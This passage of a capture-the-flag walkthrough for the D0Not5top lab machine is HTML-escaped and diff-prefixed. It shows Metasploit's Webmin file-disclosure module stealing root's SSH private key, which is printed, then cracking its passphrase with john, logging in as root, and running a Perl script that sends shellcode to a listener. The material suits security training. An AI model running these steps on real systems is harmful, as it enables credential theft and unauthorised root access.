+          ,.|         '     `-.;_'
+          :  . `  ;    `  ` --,.._;
+           ' `    ,   )   .'
+              `._ ,  '   /_
+                 ; ,''-,;' ``-
+                  ``-..__``--`
+
+                             http://metasploit.pro
+
+
+Payload caught by AV? Fly under the radar with Dynamic Payloads in
+Metasploit Pro -- learn more on http://rapid7.com/metasploit
+
+       =[ metasploit v4.11.7-                             ]
++ -- --=[ 1518 exploits - 877 auxiliary - 259 post        ]
++ -- --=[ 437 payloads - 38 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf &amp;gt; search webmin
+[!] Module database cache not built yet, using slow search
+
+Matching Modules
+================
+
+   Name                                         Disclosure Date  Rank       Description
+   ----                                         ---------------  ----       -----------
+   auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
+   auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     Webmin File Disclosure
+   exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Webmin /file/show.cgi Remote Command Execution&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;File disclosure? We can use it to get the content of &lt;b&gt;ssh keys&lt;/b&gt;. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msf &amp;gt; use auxiliary/admin/webmin/file_disclosure
+msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;file_disclosure&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; show options
+
+Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;auxiliary/admin/webmin/file_disclosure&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+
+   Name     Current Setting   Required  Description
+   ----     ---------------   --------  -----------
+   DIR      /unauthenticated  yes       Webmin directory path
+   Proxies                    no        A proxy chain of format &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;:host:port[,type:host:port][...]
+   RHOST                      yes       The target address
+   RPATH    /etc/passwd       yes       The file to download
+   RPORT    10000             yes       The target port
+   VHOST                      no        HTTP server virtual host
+
+
+Auxiliary action:
+
+   Name      Description
+   ----      -----------
+   Download
+
+
+msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;file_disclosure&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOST 10.0.2.8
+RHOST &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt; 10.0.2.8
+msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;file_disclosure&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;SSL True
+SSL &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt; True
+msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;file_disclosure&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RPATH /root/.ssh/id_rsa
+RPATH &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt; /root/.ssh/id_rsa
+msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;file_disclosure&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; exploit
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Attempting to retrieve /root/.ssh/id_rsa...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; The server returned: 200 Document follows
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,7DA162212961C0CF94C636B47C991024
+
+rDnUjh68EoasdaP40ta9QBeXtvB5uUVH9nKHKWo4KvhLcM4Z0/R6qvjSjlHir4LR
+uhTb5Y+e2C7Wze8GlYbdGksFXbUztZec26vN7xH8Q4SeI++J77agqKWRE6jJ++hd
+DsR7vDcqGbm9xX37BbE9Q4lLEHR/hNRe3/Ztrbt3obnCLvCW6H3kzpteycWAQQ3W
+BaFns85p4AZn654HoIqX/UOkztdYxgOLgpzrLh9p1bRLiaOiBCrURkpYLspeKCNN
+yfuPvNUgF1+uH78GlvLwfAA6XRj6HPDZ3D22/MxKcGixUVSPXjJlRpqyFQtvSM6T
+cN5NmXjOjmzfgafqPqf7eTFfLChcsWHUmsSneq7pQhvw/vfeGX2kizuXCago+yWt
+2IlFusQilfDDzybiunNOp+njD7TxeBLFcAUVdACfMUQ/fC0GHKeHB8q79Wi7r0SQ
+m0eC6fIXJpDavN9PtPF2v+5OH9EDKycaeWMmWT0S0fNMmIhHb+U/uhtDjQx+M9fI
+I5aBCjzCsDCoKT0qkv+dTafyqSzUN9EupCRh0NcsUT00yrQkxzM5L6C3H+61SNq8
+CNi4I50aDp8q6m0KP/GZhUAU9Uegj+JZQ1h5MSnjOpOvKbD4l6/rWM02iFVAmg4O
+WjSQfqbxGCmoHE8Y7iqgB8lRWnDYPssDXIMx+1pBkNkBASMpz6gJBZ//rJE1PkVr
+aKdhbJFR1NX097z3HXS/7SBJmyuctG+JviH7mp1fH3WMAk2iu4nSiE1aNH1YV/nW
+rXNOi5c7/yDE9o/weuJoCBL4VXeH89+l8551JOGU9RMuNk0pi/SSaUwwn7wR0/Yf
+b9Sk3pbFDS64AON1T+4zlBWWif8aRMJ7Vm6zkDsE1Jq9nKcNzDknfufs45mKVzXU
+m9dlGgzfNF46yPCuHzBZt4q1wrzg5/7gcWx5Qq6xD5VtWiMlB4G3D8DruaeqgTOi
+Sh/jFqEOErA015Ympz/0Hh/lFn0NAAJy89BPG86d+VVAn5YstQEqH6zzuIy9mZ9K
+853+0BUxA0I9rEessa+Q+NlFadBVE2FcJAr7rMsLGZFoqfvWxg5hBJFJ7jrjpQNe
+Q9qzA/CbiMeU+zdifXZwprJR1fNVWalPJJGwotwVgXN/z4s8iN1gMN9y4Kynue9k
+zQ/HqvgTkyX52ojLnM/PkXCyx7EXBAOJi5s6fv/22kcZ5Xkpw+x/VILPnJqObmU9
+RZ3IB6kbckiMld5GX+xMvYi9rvmHf/mdLj75e7PU+FjCufApXAi+T10PnvMvrCGS
+FkSlVyPPo1s4klTdrf2l6tkK6Lqu/7SamkvQvMsY7wnNT4OPI95y3GoRnwEFLd7w
+honOroF1U6leA5O8jxSxI/CIwxvb5DO/sX4bZxShlhD98yO74ImAg5ACTj/eUaVA
+/Q7bpfasSnqdKNWhx81pD6Ee9WeBZv8c0I0/EqS188O1qFYbtsaqZhYytTqYwvZ0
+p6QuusMnDaA1nB8wL7ltKXt5PhBBxSVbUKtP6DWcBRviItFTsAnmK1QhD2wmTkCu
+B8ochgwCgtAUs4cUXxnZrp5pu2yvu8Dhf//z8lBtoItPh5LTmW1N1g4s+9NKt72P
+-----END RSA PRIVATE KEY-----
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Auxiliary module execution completed
+msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;file_disclosure&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;rpath /root/.ssh/id_rsa.pub
+rpath &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt; /root/.ssh/id_rsa.pub
+msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;file_disclosure&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; exploit
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Attempting to retrieve /root/.ssh/id_rsa.pub...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; The server returned: 200 Document follows
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPKVt8KEVrr80LT9ZwRsWG8w9O2vgWd99+2+xmi3WCgCR/IrhqoJqEhX9owwiaUUnyRWrj9AKDj8Neetju9rOCTJsvWAlfFgyrRXkOV9twpLcrML+LC5GsVGLH7U/R2sTpT9Ywad0yL+FTvHZ+AbYLFpml4Gbhat6Ynhcg3Q6XmxGHXkV9cd6/XCx74K8CKEtOye1REj8KDtsC329qvbp/9Dt1ZZQEAUFvLqgLJiZxmH5snWiszcO2TKQ3lUw3tLy5rA/bXe3Bf4zuEmktEuA0NW+FTLYELrBy/5PK007Uh0CQVpVS5C+tkLtqh6meAXPp7dhi/B6qGOIXpPxjpUjH root@D0Not5top
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Auxiliary module execution completed&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now, let's save the &lt;b&gt;ssh keys&lt;/b&gt; into the coresponding files called &lt;b&gt;id_rsa&lt;/b&gt; and &lt;b&gt;id_rsa.pub&lt;/b&gt;. Now, crack them.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;ssh2john id_rsa &amp;gt; pass
+&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;john --wordlist:/usr/share/wordlists/rockyou.txt pass
+Using default input encoding: UTF-8
+Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSH &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RSA/DSA 32/64]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
+gustateamo       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;id_rsa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+1g 0:00:01:09 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2017-06-09 15:14&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.01432g/s 110970p/s 110970c/s 110970C/s gustateamo
+Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
+Session completed&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Just as 'easy' as it looks. We're ready to log in and get the final flag. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;chmod 700 id_rsa
+&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;ssh -i id_rsa root@10.0.2.8
+
+&lt;span class=&quot;gp&quot;&gt;root@D0Not5top:~# &lt;/span&gt;ls
+FL461N51D3  L45T_fl46.pl&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Remember the &lt;b&gt;L45T_fl46.pl&lt;/b&gt;? It was in the header of the first website, that we visited in this machine. Let's view it. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/perl -w&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;######################################################&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#                                                    #&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#  W311 D0n3                                         #&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#  Y0u D1d N0t5top                                   #&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#  Much0 M3Gu5t4 :D                                  #&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#                                                    #&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#  3mrgnc3                                           #&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#                                                    #&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#  Hope you had fun...                               #&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#  8ut...                                            #&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#                                                    #&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#  p.s..                                             #&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#  571ll 1 M0r3 f146 :D                              #&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#                                                    #&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;######################################################&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;IO::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ARGV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+ &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Usage: L45T_fl46.pl &amp;lt;user&amp;gt; &amp;lt;flag&amp;gt;\n\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;	&lt;span class=&quot;s&quot;&gt;&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x2d&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x00\x00\x00\x4e\x33\x76\x33\x72\x20\x41\x73\x35\x75&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x6d\x33\x21\x20\x31\x74\x20\x4d\x34\x6b\x33\x35\x20&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x34\x6e\x20\x34\x35\x35\x20\x30\x66\x20\x79\x30\x75&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\x20\x26\x20\x6d\x33\x20\x3a\x44\x00\x57\x53\x89\xe1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;\xcd\x80&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$root&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;IO::Socket::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;INET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Proto&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'tcp'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                &lt;span class=&quot;nv&quot;&gt;PeerAddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ARGV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
+                                &lt;span class=&quot;nv&quot;&gt;PeerPort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ARGV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+                            &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;die&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Unable to use [$ARGV[0]] to open [$ARGV[1]]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ebp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;TROLLOOOLLO&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$eip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\xBA\xDF\x00\xD0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$flag7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;RUN /&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;x1036&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ebp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$eip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; HTTTPEE/1.1\n\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$root&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$flag7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Done.\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Last step is to prepare the listener, then we are able to run the exploit. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@D0Not5top:~# &lt;/span&gt;./L45T_fl46.pl 10.0.2.15 6666
+Done.
+root@D0Not5top:~#
+
